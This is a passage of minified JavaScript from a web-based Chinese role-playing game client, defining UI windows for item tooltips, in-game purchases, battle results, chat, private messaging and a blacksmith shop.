t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.removeEventListener(egret.TouchEvent.TOUCH_END,this.otherClose,this)},e.prototype.otherClose=function(t){win.close(this)},e.prototype.setData=function(t,e){var i="",n=s.GlobalConfig.MoneyConfig[t];this.nameLabel.text=n.name,this.num.text=i,this.setImgData(t,e),this.description.textFlow=a.TextFlowMaker.generateTextFlow1(n.describe),this.BG.height=170+this.description.height},e.prototype.setImgData=function(t,e){var i=1;switch(t){case o.MoneyConst.yuanbao:i=5;break;case o.MoneyConst.gold:i=0}this.nameLabel.text=r.RewardData.getCurrencyName(t),this.nameLabel.textColor=l.QUALITY_COLOR[i],this.itemIcon.setIcon(r.RewardData.getCurrencyRes(t)),this.itemIcon.setImgBg2("quality"+i),this.setCount(e+"")},e.prototype.setCount=function(t){if(t.length>4){var e=Math.floor(Number(t)/1e3);t=e/10+gettext("万")}this.num.text=t},e}(n.BaseView);e.ItemCurrencyWin=h,window.ItemCurrencyWin=h,__reflect(h.prototype,"ItemCurrencyWin",[]),window.ItemCurrencyWin=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemJulingTip=void 0;var n=i(1),o=i(4),s=i(6),a=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemJulingTipSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._data=t[0],this.addTouchEvent(this.closeBtn,this.close),observe(this,this.updateDes,s.BagCT.ins().onjulingItem),s.BagCT.ins().sendJuling(this._data.configID),this.updateView()},e.prototype.updateView=function(){var t=this._data.itemConfig;o.ActorCC.isLocation?this.title.text=t.name+("("+t.id+")"):this.title.text=t.name||"",this.description.text=t.desc||"",this.itemList1.dataProvider=new eui.ArrayCollection([this._data]),this.desc1.text=""},e.prototype.updateDes=function(t){var e,i=this._data.itemConfig,n=this._data.count;this.desc1.textFlow=(new egret.HtmlTextParser).parse(gettext("聚灵丹进度:<a color=0xFF2121> {0}/{1}</a>\n数量:<a color=0x45FF7A>{2}</a>",t,((null===(e=i.useArg)||void 0===e?void 0:e.exp)||1)*n,n))},e.prototype.close=function(){win.close(this)},e}(n.BaseView);e.ItemJulingTip=a,window.ItemJulingTip=a,__reflect(a.prototype,"ItemJulingTip",[]),window.ItemJulingTip=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ItemRechargeTipWin=void 0;var n=i(8),o=i(66),s=i(5),a=i(1),r=i(0),l=i(25),h=i(7),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ItemRechargeTipSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._data=t[0],this.addTouchEvent(this.BG,this.close),this.addTouchEvent(this.useBtn,this.onClick),this.updateView(),this.lb_leftTime.text="",this._data.endTime&&Timer.start(1e3,0,this.updateTime,this)},e.prototype.removeDisplay=function(){Timer.stop(this.updateTime,this)},e.prototype.updateView=function(){var t=this._data.itemConfig,e=r.GlobalConfig.ItemRandomConfig[t.id];e&&(this.itemList1.dataProvider=new eui.ArrayCollection(e.awards));var i=r.GlobalConfig.ItemRechargeConfig[this._data.configID];if(i){var n=l.Recharge.ins().getCashByRid(i.rid)/100;this.useBtn.label=gettext("{0}购买",o.PayUtils.getPayUnitStr(n,urlParam.payUnit)),this.description.textFlow=s.TextFlowMaker.generateTextFlow(i.dec),this.desc1.text=gettext("原价:{0}",o.PayUtils.getPayUnitStr(Math.floor(i.money1*n),urlParam.payUnit))}},e.prototype.onClick=function(){var t=r.GlobalConfig.ItemRechargeConfig[this._data.configID];t&&(l.Recharge.ins().sendPayOrder(t.rid),this.close())},e.prototype.close=function(){win.close(this)},e.openCheck=function(){return!window.platform.isshen()},e.prototype.updateTime=function(){var t=Math.floor((this._data.endTime-h.GameServerCC.serverTime)/1e3);t>0?this.lb_leftTime.text=gettext("{0}后过期自动删除",n.DateUtils.getFormatBySecond(t,n.DateUtils.TIME_FORMAT_5,3)):this.lb_leftTime.text=gettext("已过期")},e}(a.BaseView);e.ItemRechargeTipWin=u,window.ItemRechargeTipWin=u,__reflect(u.prototype,"ItemRechargeTipWin",[]),window.ItemRechargeTipWin=u},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RuneTipsWin=void 0;var n=i(1),o=i(0),s=i(108),a=i(10),r=i(5),l=i(22),h=i(72),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="RuneTipsSkin",e.cur_desc="",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0];this.item_config_id=t[1],this.cur_desc=t[2],this.cur_desc2=t[3],this.addTouchEndEvent(this,this.otherClose);var i=a.ItemUtil.getQuality2(o.GlobalConfig.ItemConfig[this.item_config_id]);this.setData(this.item_config_id,i)},e.prototype.otherClose=function(t){win.close(this)},e.prototype.setData=function(t,e){void 0===e&&(e=1);var i=o.GlobalConfig.ItemConfig[t];if(i){this.itemIcon.setData(i);var n="",u=i.id%100;if(0==u?this.cur_desc2||(n=" lv."+u):0!=a.ItemUtil.getSubType(i)&&(n=" lv."+u),this.nameLabel.textFlow=(new egret.HtmlTextParser).parser("<font color = '"+(a.ItemUtil.getQualityColor(e)||0)+"'>"+i.name+n+"</font>"),1==a.ItemUtil.getType(i))this.randomAttr.text=i.desc;else{var p=o.GlobalConfig.RuneBaseConfig[t];p?this.attrLab.textFlow=r.TextFlowMaker.generateTextFlow1("|C:"+(a.ItemUtil.getQualityColor(e)||0)+"&T:"+l.AttributeData.getAttStr1(s.RuneConfigMgr.ins().getcfgAttrDataEx(p),h.AttributeFormat.FORMAT_0())):(this.randomAttr.visible=!0,this.randomAttr.text=i.desc)}}},e}(n.BaseView);e.RuneTipsWin=u,window.RuneTipsWin=u,__reflect(u.prototype,"RuneTipsWin",[]),window.RuneTipsWin=u},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BattleResultWin=void 0;var n=i(1),o=i(11),s=i(154),a=i(0),r=i(360),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._time=5,e._sn_="BattleResultSkin",e.defaultRect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.rankList.itemRenderer=r.BattleResultItemRender,this.myRewarrd.itemRenderer=o.ItemBase},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this,this.onTap),observe(this,this.updateRank,s.BattleCC.ins().postRankInfo),observe(this,this.updateMyScore,s.BattleCC.ins().postScoreChange),this.timerGroup.visible=!0,this.info.text=this._time+"",Timer.start(1e3,5,this.repeat,this),this.updateMyScore(),this.updateRank()},e.prototype.updateRank=function(){this.rankList.dataProvider=new eui.ArrayCollection(s.BattleCC.ins().getRankTop(5))},e.prototype.updateMyScore=function(){var t=s.BattleCC.ins().myRank;this.myScore.text=s.BattleCC.ins().myScore+"",this.myRanking.text=t+"";var e=Object.keys(a.GlobalConfig.CampBattlePersonalRankAwardConfig).length,i=a.GlobalConfig.CampBattlePersonalRankAwardConfig[t>0&&e>=t?t:e];this.myRewarrd.dataProvider=new eui.ArrayCollection(i.award)},e.prototype.repeat=function(){this._time--,this._time>0?this.info.text=this._time+"":this.timerGroup.visible=!1},e.prototype.onTap=function(t){switch(t.target){case this.closeBtn:send(Ts.exitFB),win.close(this)}},e}(n.BaseView);e.BattleResultWin=l,window.BattleResultWin=l,__reflect(l.prototype,"BattleResultWin",[]),window.BattleResultWin=l},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CampSelectWin=void 0;var n=i(1),o=i(105),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="campselect",e.defaultRect=!1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.gArr=[this.eG0,this.eG1,this.eG2,this.eG3]},e.prototype.addDisplay=function(){this.stage.addEventListener(egret.TouchEvent.TOUCH_TAP,this.closeThis,this),this.xzShow()},e.prototype.closeThis=function(t){var e=t.target;if(this.contains(e))for(var i in this.gArr){var n=this.gArr[i];n.contains(e)&&o.CampCC.selectMode(+i,!0)}this.xzShow()},e.prototype.xzShow=function(){for(var t=0;t<this.gArr.length;t++)this["xz"+t].visible=o.CampCC.mode==t},e.prototype.removeDisplay=function(){this.stage.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.closeThis,this)},e}(n.BaseView);e.CampSelectWin=s,window.CampSelectWin=s,__reflect(s.prototype,"CampSelectWin",[]),window.CampSelectWin=s},function(t,e){},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatEmojiWin=void 0;var n=i(1),o=i(0),s=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EmojiPanelSkin",e.layoutNum=LayoutNum.top,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.emoji,this.onChooseEmoji),this.addTouchEvent(this.closeBg,this.onTouch),this.chatInput=t[0]},e.prototype.onChooseEmoji=function(t){if(t.target instanceof eui.Image){if(!this.chatInput)return void win.close(this);var e=t.target.name,i=e.replace(/emoji_/g,""),n=o.GlobalConfig.ChatEmojiConfig[+i];this.chatInput.text==gettext("点击输入聊天内容")?this.chatInput.text=n.emojiId:this.chatInput.text=this.chatInput.text.concat(n.emojiId),win.close(this)}},e.prototype.onTouch=function(t){win.close(this)},e}(n.BaseView);e.ChatEmojiWin=s,window.ChatEmojiWin=s,__reflect(s.prototype,"ChatEmojiWin",[]),window.ChatEmojiWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatEmojiItem=e.ChatEmojiWin2=void 0;var n=i(3),o=i(1),s=i(4),a=i(13),r=i(6),l=i(31),h=i(45),u=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="EmojiPanel2Skin",e.layoutNum=LayoutNum.top,e.ac=new eui.ArrayCollection,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBg,this.onTouch),this.chatInput=t[0],this.chatType=t[1],this.list.itemRenderer=p,this.list.dataProvider=this.ac,this.list.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.onItemClick,this),this.initList()},e.prototype.initList=function(){for(var t=a.SubRoles.ins().getSubRoleByIndex(0),e=t.getEquipLen(),i=[],n=0;e>n;n++){var o=t.getEquipByIndex(n);o.item.itemConfig&&i.push(o.item)}for(var s=r.BagCT.ins().bagModel[r.BagCT.BAG_TYPE_EQUIP],n=0;n<s.length;n++)i.push(s[n]);this.ac.replaceAll(i)},e.prototype.onItemClick=function(t){var e,i,n,o;if(h.ChatCT.ins().checkLvAndRecharge()){for(var a=l.QUALITY_COLOR[(null===(e=t.item)||void 0===e?void 0:e.quality)||0],r="<a color="+a+" href = 'event:"+(null===(i=t.item)||void 0===i?void 0:i.handle)+","+s.ActorCC.actorID+"'</a>["+(null===(o=null===(n=t.item)||void 0===n?void 0:n.itemConfig)||void 0===o?void 0:o.name)+"]",u="",p="",d=0;d<this.chatInput.textFlow.length;d++)this.chatInput.textFlow[d].style&&(this.chatInput.textFlow[d].style.textColor&&(u+="<a color="+this.chatInput.textFlow[d].style.textColor+"</a>"),this.chatInput.textFlow[d].style.href&&(u+="<a href="+this.chatInput.textFlow[d].style.href+"</a>")),u+=this.chatInput.textFlow[d].text,p+=this.chatInput.textFlow[d].text;u="",u+=r,h.ChatCT.ins().sendChatInfo(this.chatType,u,0,!0),win.close(this)}},e.prototype.onTouch=function(t){win.close(this)},e}(o.BaseView);e.ChatEmojiWin2=u,window.ChatEmojiWin2=u,__reflect(u.prototype,"ChatEmojiWin2",[]),window.ChatEmojiWin2=u;var p=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){var t,e,i,n;this.clear(),(null===(t=this.data.itemConfig)||void 0===t?void 0:t.icon)&&this.itemIcon.setIcon(null===(e=this.data.itemConfig)||void 0===e?void 0:e.icon),(null===(i=this.data.itemConfig)||void 0===i?void 0:i.effId)&&this.itemIcon.setItemEff2(null===(n=this.data.itemConfig)||void 0===n?void 0:n.effId),this.itemIcon.setImgBg2("quality"+this.data.quality),this.nameTxt.textColor=l.QUALITY_COLOR[this.data.quality],this.nameTxt.text=this.data.itemConfig.name},e.prototype.clear=function(){this.scaleX=this.scaleY=1,this.alpha=1,this.skin&&(this.itemIcon&&"function"==typeof this.itemIcon.setData&&this.itemIcon.setData(null),this.count.text="",this.nameTxt.text="",this.nameTxt.textColor=14668213)},e}(n.BaseItemRender);e.ChatEmojiItem=p,window.ChatEmojiItem=p,__reflect(p.prototype,"ChatEmojiItem",[]),window.ChatEmojiItem=p},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ChatMainUI=void 0;var n=i(61),o=i(1),s=i(28),a=i(35),r=i(45),l=i(138),h=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="ChatMainSkin",e.fistOpenGuild=!0,e.defaultRect=!1,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return n.LocationProperty.isIosTS?!1:win.get("TeamFbRoomWin")?!0:win.get("RareAnimalTeamWin")?!0:!win.hasTop},e.prototype.skinComplete=function(){this.chatList.itemRenderer=l.ChatListItemRenderer3,this.dataList=new eui.ArrayCollection([]),this.chatList.dataProvider=this.dataList},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.chatList,this.onTap),observe(this,this.getNewNotice,r.ChatCT.ins().postSysChatMsg),observe(this,this.updateNewChatMsg,r.ChatCT.ins().postNewChatMsg),observe(this,this.checkShow,Ts.enterScene.enterOK),observe(this,this.updateTipShow,a.TaskCT.ins().postUpdteTaskTrace),observe(this,this.updataList,r.ChatCT.ins().postDelMsg),this.updataList(),this.updateTipShow(),this.setChatTipShow(!r.ChatCT.ins().isShowTip)},e.prototype.onTap=function(t){if(!r.ChatCT.ins().MsgOpenWin)return void(r.ChatCT.ins().MsgOpenWin=!0);switch(t.currentTarget){case this.chatList:win.open("ChatWin")}},e.prototype.getNewNotice=function(t){this.updataList()},e.prototype.refushBar=function(){Timer.start(100,1,this.refushBarList,this)},e.prototype.refushBarList=function(){this.scr.viewport.validateNow(),this.scr.viewport.contentHeight>this.scr.height&&(this.scr.viewport.scrollV=this.scr.viewport.contentHeight-this.scr.height)},e.prototype.updateNewChatMsg=function(){this.fistOpenGuild&&(this.fistOpenGuild=!1,s.Guild.ins().guildID&&s.Guild.ins().sendAllGuildMessage()),this.updataList()},e.prototype.updataList=function(){if(urlParam.isAliPayGame){var t=r.ChatCT.ins().chatListTip2;t&&(this.dataList.addItem(t),this.dataList.source.length>10&&this.dataList.removeItemAt(0),this.scr.height=this.chatGroup.height,this.refushBarList())}else this.dataList.replaceAll(r.ChatCT.ins().chatListTip2.concat()),this.scr.height=this.chatGroup.height,this.refushBar()},e.prototype.checkShow=function(){this.updataList()},e.prototype.updataLayer=function(t){t?this.chatGroup.y=616:this.chatGroup.y=546},e.prototype.setChatTipShow=function(t){this.chatList.visible=!0},e.prototype.updateTipShow=function(){var t=!0;this.setChatTipShow(t)},e}(o.BaseView);e.ChatMainUI=h,window.ChatMainUI=h,__reflect(h.prototype,"ChatMainUI",[]),window.ChatMainUI=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PlayerTipsWin=void 0;var n=i(1),o=i(93),s=i(181),a=i(28),r=i(136),l=i(182),h=i(102),u=i(2),p=i(164),d=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e.layoutNum=LayoutNum.top,e._sn_="PlayerInfoSkin",e.currId=0,e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return this.data=t[0],this.data?(this.currId=0,this.addTouchEvent(this,this.onTap),void this.initView()):void win.close("PlayerTipsWin")},e.prototype.onTap=function(t){switch(t.target){case this.btnChat:var e=o.Friends.ins().getFriendIndex(this.currId);-1!=e?(win.close(this),win.open("FriendBgWin",0,e)):u.TipsCT.ins().showTips(gettext("只有好友才能私聊"));break;case this.btnInfo:win.close(this),win.close("ChatWin"),win.open("RRoleWin",this.otherPlayerData);break;case this.btnIgnore:o.Friends.ins().sendAddBlackList(this.currId,this.userData);break;case this.btnFriend:o.Friends.ins().sendAddFriend(this.currId,this.data.name)}},e.prototype.initView=function(){if(this.btnChat.enabled=this.btnInfo.enabled=this.btnFriend.enabled=!h.KFServerSys.ins().isKF,this.userData={name:this.data.name||"",guildName:this.data.guildName||"",job:this.data.job||0,sex:this.data.sex||0,vip:this.data.vip||0,lv:this.data.lv||0,zsLv:this.data.zsLevel||0,monthCard:this.data.monthCard||0,power:this.data.power||0,appId:this.data.appId||""},this.data instanceof s.FriendData){var t=this.data;this.sName="S"+t.serverName+t.name,this.sLv=gettext("{0}{1}级",t.zs?t.zs+gettext("转"):"",t.lv),this.sGuildName=t.guildName,this.sHeadBg=p.ChatListItemRenderer.HEAD_BG[t.sex],this.sHead="head_"+t.job+t.sex,this.currId=t.id,this.userData.vip=t.vip,this.userData.zsLv=t.zs}else this.data instanceof r.GuildMemberInfo?(this.sName=this.data.name,this.sLv=gettext("{0}{1}级",this.data.zsLevel?this.data.zsLevel+gettext("转"):"",this.data.level),this.userData.guildName=this.sGuildName=a.Guild.ins().guildName?a.Guild.ins().guildName:"",this.sHeadBg=p.ChatListItemRenderer.HEAD_BG[this.data.sex],this.sHead="head_"+this.data.job+this.data.sex,this.currId=this.data.roleID,this.userData.vip=this.data.vipLevel,this.userData.lv=this.data.level,this.userData.power=this.data.attack):this.data instanceof l.GuildMessageInfo?(this.sName=this.data.name,this.sLv=gettext("{0}{1}级",this.data.zsLevel?this.data.zsLevel+gettext("转"):"",this.data.lv),this.sGuildName=this.data.guildName,this.sHeadBg=p.ChatListItemRenderer.HEAD_BG[this.data.sex],this.sHead="head_"+this.data.job+this.data.sex,this.currId=this.data.roleId,this.userData.vip=this.data.vipLevel):(this.sName=""+(this.data.servId?"S"+this.data.servId:"")+this.data.name,this.sLv=gettext("{0}{1}级",this.data.zsLevel?this.data.zsLevel+gettext("转"):"",this.data.lv),this.sGuildName=this.data.guild,this.sHeadBg=p.ChatListItemRenderer.HEAD_BG[this.data.sex],this.sHead="head_"+this.data.job+this.data.sex,this.currId=this.data.id)},e.prototype.openOtherPlayerView=function(t){this.otherPlayerData=t,win.close("FriendBgWin"),h.KFServerSys.ins().isKF},e}(n.BaseView);e.PlayerTipsWin=d,window.PlayerTipsWin=d,__reflect(d.prototype,"PlayerTipsWin",[]),window.PlayerTipsWin=d},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PrivateChatWin=void 0;var n=i(1),o=i(12),s=i(15),a=i(2),r=i(830),l=i(831),h=i(23),u=i(93),p=i(181),d=i(26),c=i(4),f=i(0),g=i(24),m=i(32),v=function(t){function e(){var e=t.call(this)||this;return e._sn_="PrivateChatWinSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listChat0.dataProvider=null,this.listChat1.itemRenderer=r.PrivateChatItem,this.listChat0.itemRenderer=l.FriendsChatItem,this.listChat1.addEventListener(egret.Event.CHANGE,this.playChange,this),this.chatInput0.addEventListener(egret.FocusEvent.FOCUS_IN,this.textInOn,this),this.addTouchEvent(this,this.onTap),this.addTouchEvent(this.listChat0,this.onListTap)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.otherPlayerData=t[0],this.recentList=u.Friends.ins().recentList,this.listChat1.dataProvider=this.recentList,observe(this,this.updateView,u.Friends.ins().postFriendChange),observe(this,this.updateInputText,h.GameLogic.ins().postInputText),u.Friends.ins().sendRecentList(),this.otherPlayerData&&this.addRecentList(),this.updateView()},e.prototype.playChange=function(t){this.updateView(),u.Friends.ins().onPrivateChatHeatClick()},e.prototype.updateInputText=function(t){this.chatInput0.text=t,this.textInOn()},e.prototype.textInOn=function(){"请输入"==this.chatInput0.text&&(this.chatInput0.text="")},e.prototype.updateView=function(t){void 0===t&&(t=0),1==t&&this.otherPlayerData&&this.addRecentList(),-1==this.listChat1.selectedIndex&&(this.listChat1.selectedIndex=0),this.selectedIndex=this.listChat1.selectedIndex;var e=this.listChat1.dataProvider,i=e.source[this.listChat1.selectedIndex];i&&(this.listChat0.dataProvider=i.acMsg,this.scroller.viewport.validateNow(),this.scroller.viewport.contentHeight>this.scroller.height&&(this.scroller.viewport.scrollV=this.scroller.viewport.contentHeight-this.scroller.height),delete u.Friends.ins().newMsg[i.id])},e.prototype.addRecentList=function(){for(var t=0;t<this.recentList.source.length;t++){var e=this.recentList.source[t];if(e.id==this.otherPlayerData.id)return void(this.listChat1.selectedIndex=t)}if(this.otherPlayerData.id!=c.ActorCC.actorID){var i=new p.FriendData(2);i.id=this.otherPlayerData.id,i.name=this.otherPlayerData.name,i.guildName=this.otherPlayerData.guildName,i.job=this.otherPlayerData.roleData[0].job,i.sex=this.otherPlayerData.roleData[0].sex,i.power=this.otherPlayerData.roleData[0].power,this.recentList.addItemAt(i,0),this.listChat1.selectedIndex=0}},e.prototype.onTap=function(t){switch(t.target){case this.sendBtn:var e=this.listChat1.dataProvider,i=e.source[this.listChat1.selectedIndex];if(!i)return;1e3*d.ZsCT.ins().lv+c.ActorCC.level<f.GlobalConfig.FriendLimit.chatLv||c.ActorCC.vip<f.GlobalConfig.FriendLimit.vipLv||(this.chatInput0.text.length>f.GlobalConfig.FriendLimit.contentLimit?a.TipsCT.ins().showTips(gettext("你说的话太长了")):this.chatInput0.text.length>0&&(u.Friends.ins().sendChat(i,this.chatInput0.text+""),this.selectedIndex=0,this.chatInput0.text=""));break;case this.faceBtn:win.open("ChatEmojiWin",this.chatInput0);break;case this.chatGroup:observe(this,this.updateInputText,h.GameLogic.ins().postInputText),"7000183"==urlParam.appid&&window.mz&&g.CommonUtils.getKeyboard(2,this.chatInput0.text+""||"")}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=o.OpenSystem.ins().checkSysOpen(s.SystemType.PrivateCaht);return i||a.TipsCT.ins().showTips(o.OpenSystem.ins().getNoOpenTips(s.SystemType.PrivateCaht)),i},e.prototype.onListTap=function(){var t=this.listChat0.selectedItem;if(t&&t instanceof p.ChatData){var e=t.msg;e&&e.indexOf("|E:")>=0&&this.onLink(e)}},e.prototype.onLink=function(t){var e=t.indexOf("|E:");t=t.slice(e+3,Number.MAX_VALUE);var i;if(t.indexOf(",")>=0?i=t.split(","):t.indexOf("*")>=0&&(i=t.split("*")),i&&!(i.length<=0))switch(i[0]){case"1":if(f.GlobalConfig.TeamFuBenBaseConfig.needZsLv>d.ZsCT.ins().stage)return void a.TipsCT.ins().showTips(gettext("{0}转后可以挑战",f.GlobalConfig.TeamFuBenBaseConfig.needZsLv));m.FbCT.ins().sendEnterTFRoom(+i[1])}},e}(n.BaseView);e.PrivateChatWin=v,window.PrivateChatWin=v,__reflect(v.prototype,"PrivateChatWin",[]),window.PrivateChatWin=v},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.PrivateChatItem=void 0;var n=i(3),o=i(93),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="PrivateChatItemSkin",e.currentState="noSelected",e}return __extends(e,t),e.prototype.dataChanged=function(){var t=this.data;this.nameLab.text=t.name,this.jobImg.source="yuanhead"+this.data.job+"1",this.showRed.visible=o.Friends.ins().newMsg[t.id]},e.prototype.selectChange=function(){if(1==this.selected)this.currentState="upAndSelected",this.showRed.visible=!1;else if(this.currentState="up",this.data){var t=o.Friends.ins().newMsg;if(t[this.data.id])return void(this.showRed.visible=t[this.data.id])}},e}(n.BaseItemRender);e.PrivateChatItem=s,window.PrivateChatItem=s,__reflect(s.prototype,"PrivateChatItem",[]),window.PrivateChatItem=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FriendsChatItem=void 0;var n=i(3),o=i(4),s=i(186),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="FriendsChatItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.label_msg&&(this.label_msg.wordWrap=!1),this.label_msg.visible=!1,this.emojiTxt=new s.EmojiText,this.emojiTxt.x=17,this.emojiTxt.y=2,this.emojiTxt.lineSpacing=8,this.group_bubble.addChild(this.emojiTxt)},e.prototype.dataChanged=function(){t.prototype.dataChanged.call(this);var e,i,n=this.data;n.fromActor.id==o.ActorCC.actorID?(n.fromActor.name=o.ActorCC.myName,e="0xE5B613",i="0xE5B613"):(e=n.fromActor.sex?"0xBC8787":"0x318ECE",i="0xFFFFFF"),this.label_date.text=n.dateStr;var s="|C:"+e+"&T:"+n.fromActor.name+"|:|C:"+i+"&T:"+n.msg+"|";this.emojiTxt.textWidth=this.group_bubble.width,this.emojiTxt.richText=s,this.emojiTxt.textColor=i,this.height=this.emojiTxt.uHeight+14+this.label_date.textHeight},e}(n.BaseItemRender);e.FriendsChatItem=a,window.FriendsChatItem=a,__reflect(a.prototype,"FriendsChatItem",[]),window.FriendsChatItem=a},function(t,e){},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BlackSmithWin=void 0;var n=i(1),o=i(0),s=i(361),a=i(43),r=i(5),l=i(48),h=i(10),u=i(31),p=i(22),d=i(30),c=i(24),f=i(4),g=i(2),m=i(217),v=i(6),y=i(23),C=i(25),T=i(90),b=i(19),w=i(36),I=i(61),_=i(7),S=i(8),x=i(85),D=i(124),A=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="BlackSmithSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.tabItem.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.updateView,this),this.tabItem.itemRenderer=s.ItemBlackSmithRender,this.tabItem.dataProvider=this.arc=new eui.ArrayCollection,this.addTouchEvent(this.btnForging,this.onClick),this.addTouchEvent(this.btnFlushed,this.onClick),this.addTouchEvent(this.btnYbFlushed,this.onClick);
var t=!window.platform.isshen()&&platform.getAdType()>0;this.btnFlushed.visible=this.lbFree.visible=t},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];observe(this,this.updateView,a.CityCC.ins().postBlackSmith),observe(this,this.updateView,f.ActorCC.postGoldChange),this.tabItem.selectedIndex=0,a.CityCC.ins().sendBlackSmith()},e.prototype.removeDisplay=function(){Timer.stop(this.updateCountDown,this)},e.prototype.updataTab=function(){for(var t=a.CityCC.ins().showBlackSmithDatas,e=[],i=0;i<t.length;i++){var n=t[i],s=o.GlobalConfig.ItemConfig[n.itemId],r=void 0;if(s){var l=new m.RandomItemData;l.id=n.itemId,l.type=1,l.count=1,l.quality=n.quality,r={item:l,isBuy:n.isBuy}}e.push(r)}this.arc.replaceAll(e)},e.prototype.updateView=function(){var t;this.updataTab(),(this.tabItem.selectedIndex<0||this.tabItem.selectedIndex>=(null===(t=a.CityCC.ins().showBlackSmithDatas)||void 0===t?void 0:t.length))&&(this.tabItem.selectedIndex=0);var e=a.CityCC.ins().showBlackSmithDatas[this.tabItem.selectedIndex];if(!e)return this.infoGp.visible=!1,void(this.btnForging.enabled=!1);this.infoGp.visible=!0,this.btnForging.enabled=!0,this.itemShow.data=e.itemId,this.itemShow.setImgBg(e.quality),this.itemShow.setTextColor(e.quality),this.curCfg=o.GlobalConfig.ItemConfig[e.itemId];var i=h.ItemUtil.getQualityColor(e.quality),n=u.QUALITY_NAME[e.quality];this.qualityLab.textFlow=r.TextFlowMaker.generateTextFlow(gettext("品质:|C:{0}&T:{1}|",i,n));var s=h.ItemUtil.getSubType(this.curCfg),d=l.Role.getEquipNameByType(s);this.type.textFlow=r.TextFlowMaker.generateTextFlow(gettext("类型:|C:{0}&T:{1}|",16777215,d));var f=h.ItemUtil.getJob(this.curCfg);this.career.textFlow=r.TextFlowMaker.generateTextFlow(gettext("职业:|C:{0}&T:{1}|",16777215,l.Role.getJobNameByJob(f))),this.lv.textFlow=r.TextFlowMaker.generateTextFlow(gettext("等级:|C:{0}&T:{1}{2}级|",65280,this.curCfg.zsLevel>0?gettext("{0}转",this.curCfg.zsLevel):"",this.curCfg.level||1));var g=o.GlobalConfig.BlacksmithBaseConfig.cost;this.countLabel.text=""+g;var m=a.CityCC.ins().getMoneyCostByLv(this.curCfg.level),v={type:0,id:1,count:e.quality*m};this.costCm.setData(v,!0,!0);var y=o.GlobalConfig.EquipConfig[this.curCfg.id],C="",T=[];for(var b in l.Role.translate)if(!isNaN(y[b])){var w=new p.AttributeData;w.type=l.Role.getAttrTypeByName(b),w.value=y[b],T.push(w)}C=p.AttributeData.getAttrShowStr(T,": "),this.attr.textFlow=r.TextFlowMaker.generateTextFlow(C);var D=c.CommonUtils.objectToArray(e.attrs),A=p.AttributeData.getAttrShowStr(D,": ",e.attrQuality);this.supExtAttr.textFlow=r.TextFlowMaker.generateTextFlow(A);var 